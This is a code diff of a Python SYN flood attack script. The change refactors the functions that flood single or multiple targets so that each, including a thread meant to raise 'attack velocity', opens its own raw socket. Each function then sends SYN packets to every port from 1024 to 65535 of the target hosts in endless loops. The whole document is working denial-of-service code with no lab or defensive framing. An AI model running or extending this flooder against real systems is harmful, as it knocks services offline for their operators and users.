@@ -1,6 +1,7 @@
 from scapy.all import *
 from cust_packet import tcp_packet, ip_packet
 import socket
+import binascii
 import os
 import threading, time, sys
 
@@ -18,9 +19,6 @@ def run(targets):
     print("Running SYN flood attack on specified target(s): " + str(targets))
     print("Processing ...")
 
-    # raw socket to connect and send packets
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-
     # determine if the user wants to go wide or deep with their attack (single target or multiple)
     if (len(targets) > 1):
         # iterate over all defined targets and flood all ports with syn requests
@@ -36,7 +34,7 @@ def run(targets):
             flooding all ports on provided machines -> wide attack
             """
             try:
-                attackMultipleTargets(s, src_ip, dest_ip)
+                attackMultipleTargets(src_ip, dest_ip)
             except (KeyboardInterrupt, SystemExit):
                 print(os.linesep + "caught keyboard interrupt and system exit occurred, halting attack.")
                 sys.exit()
@@ -54,13 +52,13 @@ def run(targets):
         attack agent. This attack is narrow/deep.
         """
         try:
-            attackSingleTarget(s, src_ip, dest_ip)
+            attackSingleTarget(src_ip, dest_ip)
         except (KeyboardInterrupt, SystemExit):
             print(os.linesep + "caught keyboard interrupt and system exit occurred, halting attack.")
             sys.exit()
 
 
-def attackMultipleTargets(socket, src_ip, dest_ip):
+def attackMultipleTargets(src_ip, dest_ip):
     # sending everything from 1300 on the host with syn flag set
     src_port = 13000 
     flags = [0,0,0,0,0,0,0,1,0]
@@ -68,27 +66,32 @@ def attackMultipleTargets(socket, src_ip, dest_ip):
     # update the client with the current attack destination
     print ("currently running attack on: " + str(dest_ip))
 
-    # flood ports >1023 on the current ip with requests
-    for dest_port in range(1024, 65535):
-        # construct layers 3 and 4 of the packet (IP and TCP)
-        tcp_segment = tcp_packet.create(src_ip, dest_ip, src_port, dest_port, flags)
-        packet = ip_packet.create(tcp_segment, src_ip, dest_ip)
+    # raw socket to connect and send packets
+    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s_multi:
+        s_multi.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        s_multi.settimeout(2)
 
-        # build and send packet
-        socket.connect((dest_ip, dest_port))
-        try:
-            socket.send(packet)
-        except OSError as e:
-            if e.errno == 105:
-                print('Socket buffer full, waiting one second then continuing to flood target.')
-                time.sleep(1)
-            else:
-                print(f'Unspecified OSError: {e}')
-        except socket.error as e:
-            print(f'Unspecified socket error: {e}')
+        # flood ports >1023 on the current ip with requests
+        for dest_port in range(1024, 65535):
+            # construct layers 3 and 4 of the packet (IP and TCP)
+            tcp_segment = tcp_packet.create(src_ip, dest_ip, src_port, dest_port, flags)
+            packet = ip_packet.create(tcp_segment, src_ip, dest_ip)
+
+            # build and send packet
+            s_multi.connect((dest_ip, dest_port))
+            try:
+                s_multi.send(packet)
+            except OSError as e:
+                if e.errno == 105:
+                    print('Socket buffer full, waiting one second then continuing to flood target.')
+                    time.sleep(1)
+                else:
+                    print(f'Unspecified OSError: {e}')
+            except socket.error as e:
+                print(f'Unspecified socket error: {e}')
 
 
-def attackSingleTarget(socket, src_ip, dest_ip):
+def attackSingleTarget(src_ip, dest_ip):
     # sending everything from 1300 on the host with syn flag on
     src_port = 13000 
     flags = [0,0,0,0,0,0,0,1,0]
@@ -100,7 +103,7 @@ def attackSingleTarget(socket, src_ip, dest_ip):
     # start a thread to increase attack velocity
     try:
         # initiate thread
-        thread = threading.Thread(target=attackVelocityIncrease, args=(socket, src_ip, dest_ip))
+        thread = threading.Thread(target=attackVelocityIncrease, args=(src_ip, dest_ip))
         # causes the thread to terminate after main process (parent thread) ends
         thread.daemon=True 
         # run thread, increasing attack velocity
@@ -109,54 +112,66 @@ def attackSingleTarget(socket, src_ip, dest_ip):
     except (KeyboardInterrupt, SystemExit):
         sys.exit()
 
-    while True:
-        # flood ports >1023 on the ip with requests
-        for dest_port in range(1024, 65535):
-            # construct layers 3 and 4 of the packet (IP and TCP)
-            tcp_segment = tcp_packet.create(src_ip, dest_ip, src_port, dest_port, flags)
-            packet = ip_packet.create(tcp_segment, src_ip, dest_ip)
+    # Let the thread get ahead so that our two sockets don't try to connect()
+    # to the same port at the same time, because this causes the OS to give an
+    # Operation not permitted error
+    time.sleep(1)
 
-            # build and send packet
-            socket.connect((dest_ip, dest_port))
-            try:
-                socket.send(packet)
-            except OSError as e:
-                if e.errno == 105:
-                    print('Socket buffer full, waiting one second then continuing to flood target.')
-                    time.sleep(1)
-                else:
-                    print(f'Unspecified OSError: {e}')
-            except socket.error as e:
-                print(f'Unspecified socket error: {e}')
+    # raw socket to connect and send packets
+    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s_single:
+        s_single.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        s_single.settimeout(2)
+  
+        while True:
+            # flood ports >1023 on the ip with requests
+            for dest_port in range(1024, 65535):
+                # construct layers 3 and 4 of the packet (IP and TCP)
+                tcp_segment = tcp_packet.create(src_ip, dest_ip, src_port, dest_port, flags)
+                packet = ip_packet.create(tcp_segment, src_ip, dest_ip)
+
+                # build and send packet
+                s_single.connect((dest_ip, dest_port))
+                try:
+                    s_single.send(packet)
+                except OSError as e:
+                    if e.errno == 105:
+                        print('Socket buffer full, waiting one second then continuing to flood target.')
+                        time.sleep(1)
+                    else:
+                        print(f'Unspecified OSError: {e}')
+                except socket.error as e:
+                    print(f'Unspecified socket error: {e}')
 
 
 # define a destination for multiple threads to stage attack on the same ip, thus increase attack velocity. 
-def attackVelocityIncrease(socket, src_ip, dest_ip):
+def attackVelocityIncrease(src_ip, dest_ip):
     src_port = 13000 
     flags = [0,0,0,0,0,0,0,1,0]
+    
+    # raw socket to connect and send packets
+    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s_velocity:
+        s_velocity.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        s_velocity.settimeout(2)
 
+        while True:
+            # flood ports >1023 on the ip with requests
+            for dest_port in range(1024, 65535):
+                # construct layers 3 and 4 of the packet (IP and TCP)
+                # ip_layer = IP(src=src_ip, dst=dest_ip)
+                # tcp_layer = TCP(sport=src_port, dport=dest_port)
+                tcp_segment = tcp_packet.create(src_ip, dest_ip, src_port, dest_port, flags)
+                packet = ip_packet.create(tcp_segment, src_ip, dest_ip)
 
-    while True:
-        # flood ports >1023 on the ip with requests
-        for dest_port in range(1024, 65535):
-            # construct layers 3 and 4 of the packet (IP and TCP)
-            # ip_layer = IP(src=src_ip, dst=dest_ip)
-            # tcp_layer = TCP(sport=src_port, dport=dest_port)
-            tcp_segment = tcp_packet.create(src_ip, dest_ip, src_port, dest_port, flags)
-            packet = ip_packet.create(tcp_segment, src_ip, dest_ip)
-
-            # build and send packet
-            # packet = ip_layer / tcp_layer
-            # send(packet, verbose=False)
-            socket.connect((dest_ip, dest_port))
-            try:
-                socket.send(packet)
-            except OSError as e:
-                if e.errno == 105:
-                    print('Socket buffer full, waiting one second then continuing to flood target.')
-                    time.sleep(1)
-                else:
-                    print(f'Unspecified OSError: {e}')
-            except socket.error as e:
-                print(f'Unspecified socket error: {e}')
+                # build and send packet
+                s_velocity.connect((dest_ip, dest_port))
+                try:
+                    s_velocity.send(packet)
+                except OSError as e:
+                    if e.errno == 105:
+                        print('Socket buffer full, waiting one second then continuing to flood target.')
+                        time.sleep(1)
+                    else:
+                        print(f'Unspecified OSError: {e}')
+                except socket.error as e:
+                    print(f'Unspecified socket error: {e}')
 
